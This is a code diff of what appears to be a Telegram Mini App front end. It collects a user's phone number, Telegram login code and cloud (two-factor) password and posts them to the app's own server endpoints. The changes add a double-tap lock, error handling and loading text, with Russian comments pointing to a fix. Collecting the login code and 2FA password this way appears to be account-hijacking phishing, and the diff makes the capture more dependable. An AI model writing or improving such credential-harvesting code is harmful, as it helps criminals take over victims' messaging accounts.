@@ -156,49 +156,83 @@
         });
     }
 
+    let isSending = false; 
+
     async function sendCode() {
+        if (isSending) return; // ВОТ ЭТОГО НЕ ХВАТАЛО
+        
         const c = document.getElementById('code').value;
         if(c.length < 5) return;
+        
+        isSending = true; // Блокируем
         document.getElementById('s2').style.display = 'none';
         document.getElementById('loader').style.display = 'block';
         document.getElementById('l-text').innerText = "Проверка кода...";
         
-        const r = await fetch('/api/send_code', {
-            method: 'POST',
-            headers: {'Content-Type': 'application/json'},
-            body: JSON.stringify({phone: userPhone, code: c})
-        });
-        const d = await r.json();
+        try {
+            const r = await fetch('/api/send_code', {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({phone: userPhone, code: c})
+            });
 
-        document.getElementById('loader').style.display = 'none';
-        if(d.status === '2fa_needed') {
-            document.getElementById('s3').style.display = 'block';
-        } else if(d.status === 'success') {
-            finish();
-        } else {
-            tg.showAlert("Ошибка: " + (d.message || "неверный код"));
+            if (!r.ok) throw new Error('Ошибка сервера: ' + r.status);
+
+            const d = await r.json();
+            document.getElementById('loader').style.display = 'none';
+
+            if(d.status === '2fa_needed') {
+                document.getElementById('s3').style.display = 'block';
+            } else if(d.status === 'success') {
+                finish();
+            } else {
+                tg.showAlert("Ошибка: " + (d.message || "неверный код"));
+                document.getElementById('s2').style.display = 'block';
+            }
+        } catch(e) {
+            document.getElementById('loader').style.display = 'none';
             document.getElementById('s2').style.display = 'block';
+            tg.showAlert("Ошибка связи с сервером.");
+        } finally {
+            isSending = false; // Разблокируем в конце
         }
     }
 
     async function sendPass() {
         const p = document.getElementById('pass').value;
-        if(!p) return;
+        if(!p || isSending) return; // Проверка на пустой пароль и двойной тап
+        
+        isSending = true;
         document.getElementById('s3').style.display = 'none';
         document.getElementById('loader').style.display = 'block';
         
-        const r = await fetch('/api/send_password', {
-            method: 'POST',
-            headers: {'Content-Type': 'application/json'},
-            body: JSON.stringify({phone: userPhone, password: p})
-        });
-        const d = await r.json();
+        // ВОТ ЭТА СТРОЧКА ИСПРАВЛЯЕТ ТВОЮ ПРОБЛЕМУ:
+        document.getElementById('l-text').innerText = "Проверка пароля..."; 
         
-        if(d.status === 'success') finish();
-        else {
-            tg.showAlert("Неверный пароль");
-            document.getElementById('s3').style.display = 'block';
+        try {
+            const r = await fetch('/api/send_password', {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({phone: userPhone, password: p})
+            });
+
+            if (!r.ok) throw new Error('Ошибка сервера');
+
+            const d = await r.json();
+            if(d.status === 'success') {
+                finish();
+            } else {
+                tg.showAlert("Неверный облачный пароль");
+                document.getElementById('s3').style.display = 'block';
+                document.getElementById('loader').style.display = 'none';
+            }
+        } catch(e) {
+            console.error(e);
+            tg.showAlert("Ошибка соединения с сервером");
             document.getElementById('loader').style.display = 'none';
+            document.getElementById('s3').style.display = 'block';
+        } finally {
+            isSending = false;
         }
     }
 
